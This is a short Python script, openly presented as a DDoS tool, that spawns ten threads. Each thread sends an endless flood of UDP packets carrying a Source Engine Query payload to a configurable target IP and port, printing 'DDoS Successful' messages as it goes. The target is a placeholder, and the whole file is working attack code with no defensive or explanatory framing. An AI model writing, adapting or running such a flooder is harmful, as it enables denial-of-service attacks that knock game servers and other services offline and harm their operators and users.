import threading
import socket

fake_ip = "0.0.0.0"
target_ip = "0.0.0.0"
target_port = 80

def ddos():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        print("[?] DDoS Created for: ( IP:", target_ip, "|", "Port:", target_port, ")")
        while True:
            s.sendto(b"\xFF\xFF\xFF\xFF\x54\x53\x6F\x75\x72\x63\x65\x20\x45\x6E\x67\x69\x6E\x65\x20\x51\x75\x65\x72\x79\x00", (target_ip, target_port))
            print("[*] DDoS Successful for: ( IP:", target_ip, "Port:", "|", target_port, ")")
    except KeyboardInterrupt:
        print("[!] DDoS Exit")
    except Exception as e:
        print("[!] DDoS an error occurred:", str(e))

for _ in range(10):
    thread = threading.Thread(target=ddos)
    thread.start()
